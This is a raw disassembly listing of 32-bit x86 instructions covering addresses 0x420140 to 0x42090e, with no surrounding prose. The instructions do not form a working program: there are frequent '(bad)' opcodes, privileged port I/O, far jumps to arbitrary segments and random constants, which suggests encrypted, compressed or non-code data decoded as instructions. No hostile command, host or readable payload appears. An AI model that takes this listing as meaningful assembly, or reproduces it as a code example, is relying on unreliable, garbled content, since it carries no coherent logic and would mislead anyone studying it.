  420140:	or     dh,bh
  420142:	inc    ebx
  420143:	shl    DWORD PTR [ecx],1
  420145:	and    BYTE PTR [ebp-0x14],bl
  420148:	test   DWORD PTR [eax-0x2cfb14f0],esp
  42014e:	and    DWORD PTR [eax+eiz*2+0x481dfbec],esp
  420155:	push   esp
  420156:	shl    BYTE PTR [ebx*2-0x56a7cfe4],cl
  42015d:	or     BYTE PTR [esi+0x37],0xd9
  420161:	dec    esi
  420162:	or     DWORD PTR [ebx+0x55],edx
  420165:	pop    ebp
  420166:	xchg   BYTE PTR [edi+0xe],dl
  420169:	adc    BYTE PTR [ecx+esi*4-0x55],ch
  42016d:	inc    edx
  42016e:	xchg   al,al
  420170:	mov    eax,0x89eaea30
  420175:	inc    ebp
  420176:	xor    ebp,ebp
  420178:	sbb    ah,BYTE PTR [eax+eiz*8-0xc]
  42017c:	test   DWORD PTR [ebx],edx
  42017e:	push   ds
  42017f:	xchg   edx,eax
  420180:	xchg   esi,eax
  420181:	xlat   BYTE PTR ds:[ebx]
  420182:	xchg   esi,eax
  420183:	sub    al,0x3a
  420185:	xchg   ebp,eax
  420186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420187:	lock jo 0x420144
  42018a:	mov    ch,0xa8
  42018c:	aam    0x23
  42018e:	sbb    ch,bh
  420190:	out    0xb3,eax
  420192:	aas    
  420193:	xchg   ecx,eax
  420194:	in     al,0x7d
  420196:	add    eax,0x4a50be61
  42019b:	jmp    FWORD PTR [edx-0x6302005a]
  4201a1:	push   es
  4201a2:	sub    eax,0xe5338f3c
  4201a7:	out    dx,eax
  4201a8:	popa   
  4201a9:	dec    ch
  4201ab:	and    DWORD PTR [edx-0x41],ecx
  4201ae:	dec    edx
  4201af:	pop    edi
  4201b0:	pop    es
  4201b1:	mov    ebp,DWORD PTR [ecx+esi*8]
  4201b4:	mov    edx,0x2b0f4013
  4201b9:	mov    al,0xae
  4201bb:	push   edx
  4201bc:	dec    ecx
  4201bd:	rcr    DWORD PTR ds:0xa67c0c4e,cl
  4201c3:	test   al,0xd9
  4201c5:	(bad)  
  4201c6:	in     eax,dx
  4201c7:	scas   eax,DWORD PTR es:[edi]
  4201c8:	gs inc ecx
  4201ca:	add    al,0x65
  4201cc:	and    bh,ch
  4201ce:	scas   eax,DWORD PTR es:[edi]
  4201cf:	mov    edi,0x10c51341
  4201d4:	mul    BYTE PTR [eax]
  4201d6:	jae    0x42024b
  4201d8:	out    0xcb,eax
  4201da:	fistp  QWORD PTR [edi-0x19af2ced]
  4201e0:	sbb    ah,BYTE PTR [edi-0x7c]
  4201e3:	sub    esp,DWORD PTR [edx+0x4f]
  4201e6:	sub    al,0x38
  4201e8:	xor    cl,BYTE PTR [ebp+0x3caba113]
  4201ee:	fild   DWORD PTR [ebx]
  4201f0:	mov    ds:0x9330428a,al
  4201f5:	jp     0x4201c6
  4201f7:	dec    esp
  4201f8:	hlt    
  4201f9:	sti    
  4201fa:	xor    eax,0xc01c0628
  4201ff:	and    esi,DWORD PTR [eax-0x4e8120da]
  420205:	aas    
  420206:	in     eax,0xde
  420208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420209:	out    dx,eax
  42020a:	and    BYTE PTR [ebx+0x1d849373],ah
  420210:	sbb    DWORD PTR [edi-0x144ff5ff],ebp
  420216:	sbb    dh,BYTE PTR [ebx+0x1d83598e]
  42021c:	into   
  42021d:	pop    eax
  42021e:	fld    QWORD PTR [ebx-0x7c]
  420221:	imul   ebx,DWORD PTR [eax],0xffffffce
  420224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420225:	(bad)  
  420226:	in     eax,dx
  420227:	inc    ecx
  420228:	push   ecx
  420229:	xor    bh,BYTE PTR ds:0x2d4df127
  42022f:	inc    eax
  420230:	sbb    esi,DWORD PTR [edi+0xc]
  420233:	leave  
  420234:	pop    DWORD PTR [esi+0x593a5c33]
  42023a:	inc    ebp
  42023b:	stos   DWORD PTR es:[edi],eax
  42023c:	pop    es
  42023d:	push   0xbaa91bc4
  420242:	sbb    ecx,DWORD PTR [ebp-0x748daadd]
  420248:	in     al,dx
  420249:	mov    ebx,0xadea3b4c
  42024e:	pop    eax
  42024f:	inc    ebx
  420250:	aam    0x70
  420252:	push   edi
  420253:	dec    ecx
  420254:	jmp    0xf28c3c31
  420259:	sub    dl,BYTE PTR [ebx+ebp*8-0x4fa07093]
  420260:	aad    0x8d
  420262:	mov    edi,0x8a88451a
  420267:	adc    dl,BYTE PTR [ecx]
  420269:	retf   
  42026a:	sbb    BYTE PTR ds:0xe927d23f,bl
  420270:	sub    eax,0xcd49614a
  420275:	mov    cl,0xb0
  420277:	arpl   WORD PTR [esi+0x26],bx
  42027a:	ss mov eax,0x2186c0d8
  420280:	pop    ebx
  420281:	test   BYTE PTR [edx+0x1e],bh
  420284:	push   ebx
  420285:	daa    
  420286:	call   0xe3cf:0x2f8a5185
  42028d:	call   FWORD PTR [eax+0x67f86c3c]
  420293:	out    dx,al
  420294:	rcl    bl,0xef
  420297:	nop
  420298:	adc    DWORD PTR [edi+0x5dbd4262],ecx
  42029e:	or     eax,0xe33acd87
  4202a3:	sbb    esp,DWORD PTR [esi-0x6105b987]
  4202a9:	xor    DWORD PTR [edi],esi
  4202ab:	and    DWORD PTR [ebp+0x6c],0xffffff8e
  4202af:	jl     0x4202a7
  4202b1:	mov    al,ds:0xfcf39454
  4202b6:	stc    
  4202b7:	loop   0x4202cc
  4202b9:	pop    edx
  4202ba:	leave  
  4202bb:	mov    bl,0xe
  4202bd:	and    al,0xc
  4202bf:	jl     0x420327
  4202c1:	jecxz  0x4202c9
  4202c3:	sbb    eax,0xa94e69f0
  4202c8:	mov    DWORD PTR [edx-0x5a3b256f],ebx
  4202ce:	xor    esi,ebx
  4202d0:	add    DWORD PTR [eax-0x6a],ecx
  4202d3:	mov    al,0x87
  4202d5:	stc    
  4202d6:	aaa    
  4202d7:	lea    ecx,[edi+0x89a2732]
  4202dd:	push   edx
  4202de:	rol    DWORD PTR [eax+0x5d],1
  4202e1:	cld    
  4202e2:	dec    ebx
  4202e3:	sbb    al,0xc6
  4202e5:	mov    eax,ds:0x25185f66
  4202ea:	imul   ebx,DWORD PTR [edi],0xffffffbc
  4202ed:	push   edi
  4202ee:	loopne 0x42027a
  4202f0:	xor    edx,DWORD PTR [edi+0x3c]
  4202f3:	adc    eax,0xa29bd591
  4202f8:	sub    eax,0x4fb65e30
  4202fd:	pop    esp
  4202fe:	sbb    DWORD PTR [edx],0x83deac36
  420304:	mov    eax,ds:0x95b60600
  420309:	pop    es
  42030a:	das    
  42030b:	mov    al,ds:0xbd6f1551
  420310:	and    BYTE PTR [ecx],dh
  420312:	int3   
  420313:	loop   0x420326
  420315:	jo     0x4202cc
  420317:	sbb    ch,al
  420319:	sahf   
  42031a:	or     DWORD PTR [ecx+0xf],ecx
  42031d:	mov    edx,DWORD PTR [edi+0x401efb1a]
  420323:	cld    
  420324:	ds sbb al,0x6b
  420327:	loopne 0x4202e8
  420329:	jmp    0xac06:0x2ae789bb
  420330:	jnp    0x420362
  420332:	push   0xfffffff3
  420334:	xchg   esp,eax
  420335:	dec    ecx
  420336:	push   ebx
  420337:	pop    ss
  420338:	adc    eax,DWORD PTR ds:0xf9a09028
  42033e:	dec    ebp
  42033f:	nop
  420340:	sub    DWORD PTR [ebx],ecx
  420342:	int3   
  420343:	retf   0xa444
  420346:	sbb    al,0x4c
  420348:	push   esi
  420349:	sti    
  42034a:	mov    ah,0xef
  42034c:	leave  
  42034d:	sub    eax,DWORD PTR [ebx+ebp*4]
  420350:	outs   dx,DWORD PTR ds:[esi]
  420351:	inc    ebx
  420352:	jmp    0x47ff:0xddf085b9
  420359:	jnp    0x42030f
  42035b:	mov    ds,WORD PTR [ecx+0x3f57ae6f]
  420361:	fcomp  QWORD PTR [ebx+0x26]
  420364:	rcr    DWORD PTR [ebx+esi*1],cl
  420367:	data16 xor dh,bh
  42036a:	inc    eax
  42036b:	push   ecx
  42036c:	add    BYTE PTR [edi-0x25],0xac
  420370:	dec    esi
  420371:	shl    BYTE PTR [eax],1
  420373:	mov    cl,0x19
  420375:	cld    
  420376:	rcl    BYTE PTR [ecx+0x5b9b717a],0xcc
  42037d:	xchg   ecx,eax
  42037e:	inc    ebx
  42037f:	adc    eax,0x3ae8140f
  420384:	adc    edx,DWORD PTR [eax+0x546f64a5]
  42038a:	adc    DWORD PTR [edi],eax
  42038c:	push   ecx
  42038d:	ret    
  42038e:	push   ds
  42038f:	sbb    bh,BYTE PTR [ebp+0x4a]
  420392:	pop    ds
  420393:	mov    al,0x66
  420395:	push   es
  420396:	push   0x7cbb9b06
  42039b:	push   es
  42039c:	xchg   esp,eax
  42039d:	jg     0x420320
  42039f:	pop    edx
  4203a0:	mov    edi,0x64c764ba
  4203a5:	xchg   edi,eax
  4203a6:	xor    al,0xdb
  4203a8:	cmc    
  4203a9:	xor    al,0x7a
  4203ab:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4203ad:	mov    esp,0xd3fac286
  4203b2:	sbb    al,0x92
  4203b4:	push   edi
  4203b5:	push   esp
  4203b6:	loop   0x42035b
  4203b8:	fbld   TBYTE PTR [ebp+0x5e060cc7]
  4203be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203bf:	in     al,0x16
  4203c1:	gs (bad) 
  4203c3:	call   0xf8d5:0x8d12af37
  4203ca:	dec    ecx
  4203cb:	pop    esi
  4203cc:	out    0x53,eax
  4203ce:	lods   al,BYTE PTR ds:[esi]
  4203cf:	mov    ebp,DWORD PTR [ecx+0x2d9a400b]
  4203d5:	sbb    DWORD PTR [eax+0x6a],esp
  4203d8:	dec    edi
  4203d9:	adc    eax,0x178ae04a
  4203df:	ss in  al,0x66
  4203e2:	pop    es
  4203e3:	fwait
  4203e4:	(bad)  
  4203e5:	dec    ebx
  4203e6:	std    
  4203e7:	ss popf 
  4203e9:	scas   eax,DWORD PTR es:[edi]
  4203ea:	push   edi
  4203eb:	mov    ebp,0x9643271
  4203f0:	mov    ah,0xb0
  4203f2:	sub    DWORD PTR [edi-0x19add18c],ebx
  4203f8:	lods   eax,DWORD PTR ds:[esi]
  4203f9:	shr    ch,cl
  4203fb:	imul   BYTE PTR [ebx+0x1e]
  4203fe:	push   esi
  4203ff:	pop    ss
  420400:	clc    
  420401:	xchg   edx,eax
  420402:	in     eax,0xb5
  420404:	push   ebp
  420405:	popa   
  420406:	add    bh,0x7b
  420409:	and    ch,BYTE PTR [edx+0x78109a92]
  42040f:	or     ecx,ebx
  420411:	test   eax,0x897c4daa
  420416:	add    ebp,DWORD PTR ds:0x410c6598
  42041c:	fucomi st,st(2)
  42041e:	sbb    ebx,ebx
  420420:	(bad)
  420423:	xchg   edx,eax
  420424:	push   ebp
  420425:	adc    al,0xc
  420427:	rcl    BYTE PTR [esi-0x44],1
  42042a:	lahf   
  42042b:	es popa 
  42042d:	hlt    
  42042e:	aam    0x23
  420430:	mov    ebx,0xe18f3052
  420435:	shl    ebp,1
  420437:	sub    al,BYTE PTR [ecx+0x7ac704b9]
  42043d:	push   0x3790739
  420442:	push   ecx
  420443:	xor    DWORD PTR [eax-0x2e],edi
  420446:	jmp    0x7e9b:0x5f34e61c
  42044d:	out    0x2e,eax
  42044f:	pop    edi
  420450:	mov    ebp,DWORD PTR [ebp+0x49]
  420453:	mov    al,ds:0x20d67050
  420458:	inc    ebp
  420459:	cwde   
  42045a:	data16 mov ch,0xce
  42045d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42045e:	cdq    
  42045f:	hlt    
  420460:	xchg   ebx,ecx
  420462:	cs loop 0x420498
  420465:	sbb    al,0x5b
  420467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420468:	cli    
  420469:	(bad)  
  42046a:	out    dx,eax
  42046b:	push   ss
  42046c:	js     0x420441
  42046e:	jmp    edx
  420470:	push   eax
  420471:	pusha  
  420472:	jb     0x42047a
  420474:	psubd  mm6,QWORD PTR [ecx]
  420477:	adc    dh,BYTE PTR [eax-0x75]
  42047a:	addr16 in al,dx
  42047c:	mov    DWORD PTR [edx+eax*1],edx
  42047f:	add    eax,0xefee8d38
  420484:	outs   dx,DWORD PTR ds:[esi]
  420485:	ss mov al,0xda
  420488:	fsub   DWORD PTR [edi+eiz*4]
  42048b:	sbb    cl,BYTE PTR [edi-0x6c64b628]
  420491:	out    dx,eax
  420492:	sub    BYTE PTR [ecx+0x1d],al
  420495:	(bad)  
  420496:	iret   
  420497:	fld    DWORD PTR [eax+edx*2+0x65]
  42049b:	shl    eax,cl
  42049d:	gs pop ecx
  42049f:	sbb    bh,BYTE PTR [edx]
  4204a1:	stos   BYTE PTR es:[edi],al
  4204a2:	mov    DWORD PTR [edi-0x15],esp
  4204a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204a6:	sbb    eax,0xde1d0613
  4204ab:	ret    
  4204ac:	out    dx,eax
  4204ad:	imul   ecx,ebp,0xffffffe6
  4204b0:	bound  edi,QWORD PTR [eax-0x27]
  4204b3:	cwde   
  4204b4:	jmp    0x5e73:0xc0bcae8d
  4204bb:	call   0xdf77:0xbae34da0
  4204c2:	jmp    0x4204f7
  4204c4:	mov    ebx,eax
  4204c6:	lds    edx,FWORD PTR [edx-0x5c7ad465]
  4204cc:	xchg   edx,eax
  4204cd:	call   0x39d1:0xc262fe72
  4204d4:	mov    dl,0xbe
  4204d6:	inc    esi
  4204d7:	and    edi,DWORD PTR [edi+0x3b600e3d]
  4204dd:	cmp    edx,DWORD PTR [ebp-0x5a]
  4204e0:	fcomp  DWORD PTR [edx+0x5071d289]
  4204e6:	jl     0x420557
  4204e8:	mov    bl,0x29
  4204ea:	push   0x44
  4204ec:	fbstp  TBYTE PTR [ecx-0xd]
  4204ef:	mov    edx,0xd92186d0
  4204f4:	(bad)  
  4204f5:	pmaxsw mm3,mm5
  4204f8:	enter  0x832e,0x51
  4204fc:	mov    al,0x6
  4204fe:	push   es
  4204ff:	je     0x420503
  420501:	stc    
  420502:	loop   0x4204b6
  420504:	stc    
  420505:	les    edi,FWORD PTR [eax]
  420507:	jns    0x4204b6
  420509:	mov    dh,BYTE PTR [ebp+0x54152790]
  42050f:	les    ebx,FWORD PTR [ebp+0x5f]
  420512:	out    0xc3,eax
  420514:	test   DWORD PTR [esi+0x34],ebp
  420517:	enter  0xb9e1,0xa6
  42051b:	adc    eax,0x7b0c616f
  420520:	push   ecx
  420521:	ret    
  420522:	(bad)  
  420523:	nop
  420524:	pop    DWORD PTR ds:0xa0e08d51
  42052a:	or     DWORD PTR [eax],edi
  42052c:	xor    eax,0xbc4770da
  420531:	stc    
  420532:	mov    esp,0x7a60421b
  420537:	cs ret 0x41bf
  42053b:	into   
  42053c:	mov    ah,0xca
  42053e:	adc    BYTE PTR [ebx+0x7ae218a9],ah
  420544:	mov    WORD PTR [ebx+0x61],?
  420547:	fs dec eax
  420549:	xchg   edx,eax
  42054a:	inc    ebx
  42054b:	adc    DWORD PTR [eax-0x634c82c0],ebx
  420551:	into   
  420552:	ror    bl,1
  420554:	adc    eax,0xf28ae642
  420559:	rcr    DWORD PTR [esi+0x4e7c783d],1
  42055f:	ins    DWORD PTR es:[edi],dx
  420560:	dec    esp
  420561:	outs   dx,DWORD PTR gs:[esi]
  420563:	lock stos DWORD PTR es:[edi],eax
  420565:	cmp    edi,DWORD PTR [ebp+0x3a]
  420568:	imul   esp,DWORD PTR [eax-0x2f],0x809f0fc7
  42056f:	imul   ebp,DWORD PTR [ecx+ebp*2-0x5fb4f31a],0xffffffa5
  420577:	jmp    0x9cfd1afe
  42057c:	(bad)  
  42057d:	cmp    eax,0xcff45f10
  420582:	shr    BYTE PTR [ecx+0x3e812017],cl
  420588:	jmp    0x824c:0x15881a26
  42058f:	ins    DWORD PTR es:[edi],dx
  420590:	xor    al,0xa0
  420592:	or     bh,al
  420594:	cli    
  420595:	test   DWORD PTR [edi],edx
  420597:	shl    DWORD PTR [edx],1
  420599:	jmp    0x3e05:0xc16431e
  4205a0:	pop    eax
  4205a1:	fcmovbe st,st(2)
  4205a3:	fcom   st(2)
  4205a5:	push   esp
  4205a6:	enter  0xf9e6,0xa4
  4205aa:	sbb    BYTE PTR [ebx],0x54
  4205ad:	popf   
  4205ae:	das    
  4205af:	mov    esp,0xfafdf4ec
  4205b4:	jo     0x420607
  4205b6:	ins    DWORD PTR es:[edi],dx
  4205b7:	rcr    DWORD PTR [eax],0x14
  4205ba:	sub    DWORD PTR [edx-0x27],ecx
  4205bd:	fdivr  st(5),st
  4205bf:	(bad)  
  4205c0:	mov    ds:0xc41f6375,eax
  4205c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205c6:	fisub  DWORD PTR [edx+0x34]
  4205c9:	mov    al,0x80
  4205cb:	cld    
  4205cc:	cdq    
  4205cd:	xor    eax,0xf6bb9911
  4205d2:	mov    eax,ds:0x184c0434
  4205d7:	ja     0x4205c8
  4205d9:	add    ch,BYTE PTR [eax-0x3a]
  4205dc:	pop    ds
  4205dd:	cmp    al,0xdc
  4205df:	mov    bl,BYTE PTR [edi-0x9088b66]
  4205e5:	rep lods eax,DWORD PTR ds:[esi]
  4205e7:	(bad)  
  4205e8:	popf   
  4205e9:	or     eax,0x119f55fd
  4205ee:	cmp    eax,0xd6cd5af4
  4205f3:	dec    edx
  4205f4:	cwde   
  4205f5:	fstp   QWORD PTR [ecx]
  4205f7:	adc    eax,0xac92c28b
  4205fc:	xchg   edx,eax
  4205fd:	rcl    DWORD PTR [ebx],cl
  4205ff:	in     al,dx
  420600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420601:	dec    ebp
  420602:	jl     0x420587
  420604:	jle    0x420607
  420606:	pop    ss
  420607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420608:	sbb    al,0xa1
  42060a:	mov    DWORD PTR [esi-0x7a3d2aec],edi
  420610:	cmp    BYTE PTR [edx-0x5f],bl
  420613:	(bad)  
  420614:	sbb    esp,esi
  420616:	dec    ebx
  420617:	mov    dl,BYTE PTR [esi+0x78e3bca9]
  42061d:	mov    BYTE PTR [eax],ah
  42061f:	xchg   ebp,eax
  420620:	repz ss int3 
  420623:	icebp  
  420624:	fsub   QWORD PTR [eax-0x5f99ecf1]
  42062a:	pusha  
  42062b:	xchg   esi,eax
  42062c:	(bad)  [ebp-0x5a]
  42062f:	lods   al,BYTE PTR ds:[esi]
  420630:	popf   
  420631:	or     ch,ch
  420633:	nop
  420634:	xlat   BYTE PTR ds:[ebx]
  420635:	out    dx,eax
  420636:	or     cl,bl
  420638:	push   ecx
  420639:	dec    edi
  42063a:	stos   BYTE PTR es:[edi],al
  42063b:	mov    DWORD PTR [ebx+0x3a],0x2394aeaa
  420642:	aaa    
  420643:	fs or  ax,0xf0e4
  420648:	mov    al,BYTE PTR [ebp-0x2f]
  42064b:	adc    BYTE PTR [edi-0x6f],ah
  42064e:	bound  esi,QWORD PTR [eax]
  420650:	popa   
  420651:	xor    edx,DWORD PTR [edx+0x45]
  420654:	xlat   BYTE PTR ds:[ebx]
  420655:	loop   0x42062e
  420657:	fsubr  st,st(0)
  420659:	aam    0xf3
  42065b:	add    BYTE PTR [ecx],ah
  42065d:	and    BYTE PTR [edx+0x74],al
  420660:	repnz int3 
  420662:	in     eax,dx
  420663:	je     0x420650
  420665:	es retf 
  420667:	mov    edi,0x250df1b7
  42066c:	xchg   ebx,eax
  42066d:	jne    0x42062f
  42066f:	add    BYTE PTR [ebx-0x5bdadc7c],ch
  420675:	bound  esp,QWORD PTR [ecx+ebp*1+0x25]
  420679:	pushf  
  42067a:	shl    DWORD PTR [ebp+0x30],1
  42067d:	push   esp
  42067e:	mov    bl,0x10
  420680:	sub    ah,BYTE PTR [ebp+ebx*1-0xe2101c9]
  420687:	arpl   WORD PTR [edx],di
  420689:	push   ecx
  42068a:	arpl   sp,dx
  42068c:	je     0x4206d0
  42068e:	jl     0x4206ce
  420690:	test   DWORD PTR [edi*2+0x7a5984e8],esp
  420697:	ss mov esp,0x7a96a902
  42069d:	or     al,0x1
  42069f:	pop    edx
  4206a0:	jnp    0x420627
  4206a2:	jmp    0x2b1d:0x7e4a4ff
  4206a9:	ins    DWORD PTR es:[edi],dx
  4206aa:	xchg   edx,eax
  4206ab:	adc    ch,dh
  4206ad:	out    dx,al
  4206ae:	dec    eax
  4206af:	adc    dl,ah
  4206b1:	and    al,0xdf
  4206b3:	pop    ds
  4206b4:	mov    esp,0x267c2427
  4206b9:	in     al,dx
  4206ba:	in     eax,dx
  4206bb:	xor    BYTE PTR [eax],cl
  4206bd:	sbb    ah,BYTE PTR [esi+esi*1-0x75050758]
  4206c4:	xchg   DWORD PTR [eax+ebp*8],esi
  4206c7:	push   esp
  4206c8:	pop    es
  4206c9:	mov    ecx,0x54da683c
  4206ce:	cld    
  4206cf:	cmp    BYTE PTR [esi-0x45b2d43d],bl
  4206d5:	repz daa 
  4206d7:	es add al,0x4
  4206da:	nop
  4206db:	das    
  4206dc:	dec    ecx
  4206dd:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206df:	pop    ebx
  4206e0:	xchg   BYTE PTR [edi+0x57],dh
  4206e3:	ins    DWORD PTR es:[edi],dx
  4206e4:	fcom   st(4)
  4206e6:	add    edx,DWORD PTR [edx-0x792fd40d]
  4206ec:	ins    DWORD PTR es:[edi],dx
  4206ed:	push   edi
  4206ee:	in     eax,0x18
  4206f0:	aaa    
  4206f1:	jmp    0x4206ef
  4206f3:	jno    0x42074c
  4206f5:	loop   0x4206e6
  4206f7:	lahf   
  4206f8:	push   ecx
  4206f9:	cdq    
  4206fa:	xchg   edx,eax
  4206fb:	mov    eax,0x45861cad
  420700:	or     BYTE PTR [ecx+0x1eb4a51f],dh
  420706:	push   es
  420707:	adc    cl,bh
  420709:	mov    ds:0x8cdad558,al
  42070e:	call   0xe0ef86db
  420713:	sub    BYTE PTR [ebp+0x42],0x79
  420717:	in     eax,dx
  420718:	push   ds
  420719:	(bad)  
  42071a:	aam    0x9a
  42071c:	outs   dx,BYTE PTR ds:[esi]
  42071d:	retf   
  42071e:	and    BYTE PTR [edi+eax*2],bh
  420721:	pop    esp
  420722:	jl     0x4206c3
  420724:	jecxz  0x4206c7
  420726:	mov    eax,ds:0xcc785f83
  42072b:	jb     0x4206f6
  42072d:	ds (bad) 
  42072f:	aaa    
  420730:	leave  
  420731:	mov    ah,0xb6
  420733:	or     BYTE PTR [esi-0x5a32d2a7],ch
  420739:	push   cs
  42073a:	not    BYTE PTR [eax]
  42073c:	pop    ds
  42073d:	(bad)  
  42073e:	sub    DWORD PTR [edi-0x5722d903],esp
  420744:	scas   eax,DWORD PTR es:[edi]
  420745:	jecxz  0x42072b
  420747:	push   ds
  420748:	pop    ds
  420749:	lock mov ecx,0x50c5d170
  42074f:	ja     0x420750
  420751:	mov    ebx,ecx
  420753:	imul   esi,DWORD PTR [esp+ebx*2+0x26],0x6
  420758:	jmp    0x664c7de0
  42075d:	mov    DWORD PTR [ebx],ebp
  42075f:	jno    0x42071b
  420761:	call   0xc7d5c264
  420766:	xchg   esi,eax
  420767:	xchg   BYTE PTR [esi+0x36],dh
  42076a:	sub    al,0x9d
  42076c:	stc    
  42076d:	(bad)  
  42076e:	or     BYTE PTR [eax-0x3a],dl
  420771:	clc    
  420772:	jbe    0x4206f7
  420774:	fistp  DWORD PTR [esi]
  420776:	fiadd  WORD PTR [ecx]
  420778:	pop    edx
  420779:	and    eax,0xf55ab2f2
  42077e:	pop    ss
  42077f:	es xchg edi,eax
  420781:	fisubr WORD PTR [ebp+ebx*4-0x7a43e07f]
  420788:	xor    DWORD PTR [esi+esi*8-0xde7ba11],edx
  42078f:	push   cs
  420790:	or     DWORD PTR [ebp+0x4eb0bbb9],0xee7428a3
  42079a:	push   esp
  42079b:	jbe    0x42079e
  42079d:	addr16 loope 0x420781
  4207a0:	adc    edx,DWORD PTR [ebx-0x6c]
  4207a3:	ds pop es
  4207a5:	jns    0x42072c
  4207a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a8:	adc    eax,0x134cd13a
  4207ad:	inc    ecx
  4207ae:	mov    eax,0xb61e8e7
  4207b3:	repz or eax,0x420ea5a
  4207b9:	scas   eax,DWORD PTR es:[edi]
  4207ba:	arpl   WORD PTR [ebx],si
  4207bc:	sahf   
  4207bd:	xchg   ebx,eax
  4207be:	push   ds
  4207bf:	inc    esp
  4207c0:	sti    
  4207c1:	lds    edi,FWORD PTR [eax-0xb615e00]
  4207c7:	mov    bh,0x43
  4207c9:	sahf   
  4207ca:	cmp    ah,BYTE PTR [eax]
  4207cc:	gs push 0xffffffdf
  4207cf:	adc    ax,0x4c62
  4207d3:	add    DWORD PTR [edi],edi
  4207d5:	sti    
  4207d6:	and    al,0x72
  4207d8:	shl    DWORD PTR [ebp-0x44],cl
  4207db:	push   0xffffff99
  4207dd:	pop    esp
  4207de:	cdq    
  4207df:	es xor eax,0xfd12f71a
  4207e5:	pop    ebp
  4207e6:	xor    ebp,0xde9265c8
  4207ec:	fst    QWORD PTR [edi+edi*8-0x56]
  4207f0:	mov    DWORD PTR [edi-0x18161483],edi
  4207f6:	out    dx,al
  4207f7:	inc    ebx
  4207f8:	loopne 0x4207c2
  4207fa:	ds in  al,dx
  4207fc:	push   0x677d18a
  420801:	or     BYTE PTR [ebp+ebx*4-0x251e6106],bl
  420808:	fsub   st,st(3)
  42080a:	or     BYTE PTR [ebp+esi*8-0x3ed35e41],cl
  420811:	sub    eax,0xe6c366c3
  420816:	fwait
  420817:	ja     0x42087b
  420819:	mov    bh,0xd2
  42081b:	mov    dh,0xae
  42081d:	sbb    DWORD PTR [ecx+esi*8],ecx
  420820:	loopne 0x420854
  420822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420823:	std    
  420824:	xor    al,BYTE PTR [ebx+edx*2]
  420827:	sub    eax,0x24ad891a
  42082c:	mov    esi,0x930b62fe
  420831:	iret   
  420832:	push   ebp
  420833:	xor    DWORD PTR [ecx],edx
  420835:	(bad)  
  420836:	(bad)  
  420837:	pop    eax
  420838:	inc    eax
  420839:	int3   
  42083a:	jmp    0x20d5744e
  42083f:	(bad)  
  420840:	xlat   BYTE PTR ds:[ebx]
  420841:	sbb    al,0xe0
  420843:	sbb    dl,BYTE PTR [edx-0x27]
  420846:	sub    esp,esi
  420848:	sub    dl,bh
  42084a:	mov    ah,0xa1
  42084c:	inc    esp
  42084d:	or     ebp,ebx
  42084f:	add    al,0x56
  420851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420852:	xor    eax,0xdc728b9a
  420857:	pop    ebx
  420858:	dec    ebx
  420859:	test   al,cl
  42085b:	push   0x6d
  42085d:	cdq    
  42085e:	dec    edx
  42085f:	int3   
  420860:	loop   0x42089d
  420862:	inc    ecx
  420863:	stos   BYTE PTR es:[edi],al
  420864:	dec    esp
  420865:	stos   BYTE PTR es:[edi],al
  420866:	das    
  420867:	adc    DWORD PTR [esi-0x53],ebp
  42086a:	ret    
  42086b:	mov    edx,0xc5cb26eb
  420870:	push   ebx
  420871:	retf   
  420872:	cmp    ch,dh
  420874:	mov    eax,ds:0x242ff54a
  420879:	test   al,0xcb
  42087b:	sub    DWORD PTR [ecx],esi
  42087d:	bound  ebp,QWORD PTR [esi]
  42087f:	mov    ch,0xef
  420881:	mov    ecx,0xdf389f94
  420886:	rcl    DWORD PTR [esi],1
  420888:	sbb    al,ch
  42088a:	ficomp WORD PTR [edx+0x1dcb90eb]
  420890:	ret    
  420891:	fwait
  420892:	data16 loop 0x420849
  420895:	outs   dx,DWORD PTR ds:[esi]
  420896:	test   DWORD PTR [edi-0x50],eax
  420899:	and    BYTE PTR es:[edx],dh
  42089c:	int    0x3d
  42089e:	in     eax,0xc4
  4208a0:	test   al,0x5f
  4208a2:	jp     0x420887
  4208a4:	outs   dx,BYTE PTR ds:[esi]
  4208a5:	add    eax,edx
  4208a7:	lods   al,BYTE PTR ds:[esi]
  4208a8:	or     edi,esi
  4208aa:	iret   
  4208ab:	(bad)  
  4208ac:	or     al,0x67
  4208ae:	retf   
  4208af:	scas   eax,DWORD PTR es:[edi]
  4208b0:	(bad)  
  4208b1:	(bad)  [edi-0x61]
  4208b4:	ja     0x42086e
  4208b6:	call   0x916a:0x800d48dd
  4208bd:	das    
  4208be:	dec    esi
  4208bf:	popf   
  4208c0:	xor    ebp,eax
  4208c2:	hlt    
  4208c3:	icebp  
  4208c4:	xor    BYTE PTR [ebx-0x180c310e],ah
  4208ca:	ja     0x42090d
  4208cc:	sahf   
  4208cd:	clc    
  4208ce:	lods   eax,DWORD PTR ds:[esi]
  4208cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d0:	in     al,0x4f
  4208d2:	lea    ebx,[ebx-0x5d]
  4208d5:	sub    al,0xb2
  4208d7:	in     al,0x50
  4208d9:	in     al,dx
  4208da:	ds sbb al,0x1f
  4208dd:	and    eax,0x4a68654f
  4208e2:	push   ebp
  4208e3:	or     DWORD PTR [esi],0xffffff8b
  4208e6:	sbb    DWORD PTR [ebx-0x2765323c],ecx
  4208ec:	test   eax,0xcb405ac0
  4208f1:	mov    BYTE PTR [eax-0x5b],dl
  4208f4:	add    eax,0xd2841eb2
  4208f9:	adc    DWORD PTR [edx+0x2f3afabb],edx
  4208ff:	shr    BYTE PTR [eax+0x70],cl
  420902:	dec    esp
  420903:	mov    ebp,esp
  420905:	adc    esi,DWORD PTR [ecx-0x651479f8]
  42090b:	pop    ecx
  42090c:	icebp  
  42090d:	iret   
  42090e:	sub    ch,dl
